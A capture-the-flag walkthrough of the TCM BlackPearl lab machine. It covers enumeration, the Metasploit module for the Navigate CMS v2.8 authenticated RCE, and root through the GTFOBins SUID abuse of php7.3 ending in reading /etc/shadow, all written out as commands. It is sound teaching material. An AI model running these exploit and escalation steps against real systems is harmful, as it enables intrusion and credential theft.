# TCM BlackPearl — CTF Writeup

**Platform:** TCM Security  
**Full Walkthrough (with screenshots):** [Read on Medium](https://medium.com/@olamideoyek/tcm-blackpearl-walkthrough-f0d0b12d3710)

---

## Overview

A Linux-based machine requiring web enumeration, DNS zone enumeration, and subdomain discovery to expose a Navigate CMS instance. A known RCE vulnerability in Navigate CMS v2.8 was exploited via Metasploit to gain an initial foothold, followed by privilege escalation through a SUID misconfiguration on the `php7.3` binary.

---

## Attack Chain Summary

```
Host Discovery (ifconfig) → Nmap Scan → Web Enumeration (Port 80)
→ DNS Enumeration (Port 53) → Subdomain Discovery → Navigate CMS Login
→ Metasploit RCE → Meterpreter Shell → TTY Upgrade
→ LinPEAS → SUID PHP Abuse → Root
```

---

## Step 1 — Host Discovery

```bash
ifconfig
```

After setting up the BlackPearl VM, `ifconfig` was used to identify the machine's assigned IP address on the local network.

---

## Step 2 — Port Scanning & Enumeration

```bash
nmap <target-ip>
```

**Open Ports:**

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.9p1 |
| 53 | DNS | BIND 9.11.5 |
| 80 | HTTP | nginx 1.14.2 |

**OS:** Linux

---

## Step 3 — Web Enumeration (Port 80)

Navigating to `http://<target-ip>` returned the default **Nginx landing page**.

### Page Source Analysis
Inspecting the page source revealed an email address:

```
alek@blackpearl.tcm
```

This hinted at a potential domain name: `blackpearl.tcm`.

### Directory Busting
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

**Finding:** A `/secret` directory was discovered. Navigating to it returned a `.txt` file containing only a taunting message — a dead end.

---

## Step 4 — DNS Enumeration (Port 53)

Since port 80 yielded little, attention shifted to the open DNS service on port 53. A reverse DNS lookup and subdomain enumeration confirmed the domain:

```
blackpearl.tcm
```

### Add Domain to /etc/hosts
```bash
sudo nano /etc/hosts

# Add the following line:
192.168.158.142    blackpearl.tcm
```

### Revisiting Port 80 via Domain
Navigating to `http://blackpearl.tcm` now returned a **`phpinfo()` page**, exposing PHP configuration details and the server environment.

### Second Round of Directory Busting
```bash
gobuster dir -u http://blackpearl.tcm -w /usr/share/wordlists/dirb/common.txt
```

**Finding:** A `/navigate` directory was discovered.

---

## Step 5 — Exploitation (Navigate CMS RCE)

Accessing `http://blackpearl.tcm/navigate` revealed a login page running **Navigate CMS v2.8**.

### Vulnerability Research
A Metasploit module was identified targeting an authenticated RCE vulnerability in Navigate CMS v2.8.

**Module:** `exploit/multi/http/navigate_cms_rce`

### Metasploit Setup & Execution
```bash
msfconsole

use exploit/multi/http/navigate_cms_rce
options
set RHOSTS 192.168.149.130 (use your own target ip)
set VHOST blackpearl.tcm
check
run
```

The exploit executed successfully and returned a **Meterpreter session**, confirming remote code execution on the target.

### Shell Upgrade
The initial shell was non-interactive. A TTY shell was spawned for a usable environment:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Step 6 — Privilege Escalation (SUID PHP)

### Automated Enumeration with LinPEAS
LinPEAS was transferred to the target and executed to identify privilege escalation vectors.

**Key Finding:** The `php7.3` binary had the **SUID bit set** — flagged as a high-priority finding.

```
/usr/bin/php7.3   -->  SUID binary
```

### GTFOBins Exploit
A SUID abuse method for PHP was found on GTFOBins. The command was adjusted to match the binary name on the target system (`php7.3` instead of `php`):

```bash
CMD="/bin/sh"
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

### Verification
```bash
id
# uid=33(www-data) gid=33(www-data) euid=0(root)

cat /etc/shadow
# Successfully read — full root access confirmed
```

**Result: Root access achieved.**

---

## Key Findings Summary

| Phase | Finding | Impact |
|-------|---------|--------|
| Page source | `alek@blackpearl.tcm` email | Domain name leak |
| DNS enumeration | `blackpearl.tcm` domain | Exposed CMS via subdomain |
| phpinfo() page | PHP version & server config | Information disclosure |
| Navigate CMS v2.8 | Authenticated RCE (Metasploit) | Remote code execution |
| SUID `php7.3` | GTFOBins SUID abuse | Privilege escalation to root |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `ifconfig` | Host IP discovery |
| `nmap` | Port scanning & service detection |
| `ffuf` | Directory/content fuzzing |
| `Metasploit` | Navigate CMS RCE exploitation |
| `python3 pty` | Interactive TTY shell upgrade |
| `LinPEAS` | Automated privilege escalation enumeration |
| GTFOBins | SUID PHP exploitation reference |

---

## Key Takeaways

- **Page source review** is a simple but often overlooked step that can leak critical information like emails and domain hints.
- **DNS enumeration** is essential — open port 53 can reveal subdomains that expose entirely different attack surfaces.
- **`phpinfo()` pages** should never be publicly accessible; they expose server configuration and version details useful to attackers.
- **Outdated CMS versions** with known CVEs are a significant risk — Navigate CMS v2.8 had a publicly available Metasploit module.
- **SUID binaries** on interpreters like PHP, Python, or Perl are critical findings — always check GTFOBins for immediate exploitation paths.

---

> ⚠️ **Disclaimer:** This walkthrough was performed in an isolated lab environment for educational purposes only.
